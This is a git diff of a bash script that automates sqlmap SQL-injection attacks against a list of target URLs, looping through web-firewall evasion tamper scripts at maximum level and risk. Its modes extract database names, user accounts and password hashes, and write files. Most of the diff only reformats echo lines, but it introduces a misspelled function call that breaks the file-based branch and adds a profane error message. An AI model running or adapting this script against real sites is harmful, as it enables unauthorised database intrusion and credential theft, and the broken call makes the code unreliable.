@@ -14,7 +14,7 @@ echo "WARNING!!!
              Nobody takecare of repsonsiblity of you action. always takes a permission."
 echo " "
 }
-
+# array of tamper 
 tamp=('apostrophemask' 'apostrophenullencode' 'base64encode' 'between' 'bluecoat' 'chardoubleencode' 'charencode' 'charunicodeencode''concat2concatws ''equaltolike''greatest''halfversionedmorekeywords''ifnull2ifisnull''modsecurityversioned''modsecurityzeroversioned''multiplespaces''nonrecursivereplacement''percentage''randomcase''randomcomments''securesphere''space2comment''space2dash''space2hash''space2morehash''space2mssqlblank''space2mysqldash''space2plus''space2randomblank''unionalltounion''unmagicquotes')
 
 
@@ -26,9 +26,9 @@ tamp=('apostrophemask' 'apostrophenullencode' 'base64encode' 'between' 'bluecoat
 injection () {
              
     for i in "${tamp[@]}"; do #${arrayName[@]}
-    ##################################
-    echo "$i"
-    ##################################
+  echo "##################################"
+    echo     "$i"
+    echo "##################################"
         sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbs tamper="$i" --alert="Vulnerability Found"
     
     done
@@ -43,9 +43,9 @@ injection () {
 file_based_attack() {
 
     for i in "${tamp[@]}"; do #${arrayName[@]}
-    ##################################
-    echo "$i"
-    ##################################
+  echo "##################################"
+    echo     "$i"
+    echo "##################################"
        sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbs tamper="$i" --alert="Vulnerability Found"
     
     done
@@ -60,9 +60,9 @@ file_based_attack() {
 brute_based_attacks () {
 
     for i in "${tamp[@]}"; do #${arrayName[@]}
-    ##################################
-    echo "$i"
-    ##################################
+    echo "##################################"
+    echo     "$i"
+    echo "##################################"
         sqlmap -m "$urls"  --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --users --passwords --tamper="$i" --alert="Vulnerability Found"
     
     done
@@ -76,9 +76,9 @@ brute_based_attacks () {
 time_based_attacks () {
 
     for i in "${tamp[@]}"; do #${arrayName[@]}
-    ##################################
-    echo "$i"
-    ##################################
+    echo "##################################"
+    echo     "$i"
+    echo "##################################"
     sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --time-sec=5 --dbs --tamper="$i" --alert="Vulnerability Found"
     
     done 
@@ -92,9 +92,9 @@ time_based_attacks () {
 error_based_attacks () {
 
     for i in "${tamp[@]}"; do #${arrayName[@]}
-    ##################################
-    echo "$i"
-    ##################################
+    echo "##################################"
+    echo     "$i"
+    echo "##################################"
    sqlmap -m "$urls" --dbms="$dbms"--level=5 --risk=3 --threads=5 --batch --errors --tamper="$i" --alert="Vulnerability Found"
 
     
@@ -109,9 +109,9 @@ error_based_attacks () {
 blind_based_attacks () {
 
     for i in "${tamp[@]}"; do #${arrayName[@]}
-    ##################################
-    echo "$i"
-    ##################################
+    echo "##################################"
+    echo     "$i"
+    echo "##################################"
     sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbms-cred --tamper="$i" --alert="Vulnerability Found"
 
     
@@ -125,9 +125,9 @@ blind_based_attacks () {
 out_of_band_attacks () {
 
     for i in "${tamp[@]}"; do #${arrayName[@]}
-    ##################################
-    echo "$i"
-    ##################################
+    echo "##################################"
+    echo      "$i"
+    echo "##################################"
     sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --oob --file-write="/tmp/data.txt" --tamper="$i" --alert="Vulnerability Found"
 
     
@@ -144,9 +144,9 @@ out_of_band_attacks () {
 database_detect () {
 
     for i in "${tamp[@]}"; do #${arrayName[@]}
-    ##################################
-    echo "$i"
-    ##################################
+    echo "##################################"
+    echo   "$i"
+    echo "##################################"
     sqlmap -m "$urls"  --level=5 --risk=3 --threads=5 --batch --banner --tamper="$i" --alert="Vulnerability Found"
 
     
@@ -163,43 +163,61 @@ process () {
     case $attack in 
 
         injection_based )
-                      echo "Injection Attacks..."
+                      echo " "
+                      echo "(+)Injection Attacks..."
+                      echo " "
+
                      injection #function 
                       break
                        ;;
         
         file_based )
-                   echo "File Based Attacks"
-                   file_based_attack
+                    echo " "
+                   echo "(+)File Based Attacks..."
+                   echo " "    
+                #echo "====================="
+                   file_based_attackw
                    break
                     ;;         
        blind_based)
-                   echo "Blind Based Attack"
+                    echo " "
+                   echo "(+)Blind Based Attack..."
+                   echo " "
                    blind_based_attacks
                    break
                    ;;
         brute_based)
-                   echo "Brute Based Attacks"
+                    echo " "
+                   echo "(+)Brute Based Attacks..."
+                   echo " "
                    brute_based_attacks
                    break
                    ;;
         time_based)
-                   echo "Time Based Attacks"
+                    echo " "
+                   echo "(+)Time Based Attacks..."
+                   echo " "
                    time_based_attacks
                    break
                    ;;
         error_based)
-                   echo "Error Based Attacks"
+                    echo " "
+                   echo "(+)Error Based Attacks..."
+                   echo " "
                    error_based_attacks
                    break
                    ;;
         out_of_band)
-                   echo "Out OF Band Attacks"
+                   echo " "
+                   echo "(+)Out OF Band Attacks..."
+                   echo " "
                    out_of_band_attacks
                    break
                    ;;
             bayekar)
-                echo "All attack on single traget"
+              echo " "
+                echo "(+)All attack on single traget..."
+                echo " "
                 ################################
                 sleep 3
                 clear
@@ -221,12 +239,15 @@ process () {
                 break
                  ;;
   data_base_detect)
-                  echo "Database Detection Start..."
+                    echo " "
+                  echo "(+)Database Detection Start..."
+                  echo " "
                   database_detect
                   continue
                   ;;
                  *)
-                 echo "Try again.."
+
+                 echo "Try again..fuck you"
                    continue
                   ;;
             esac
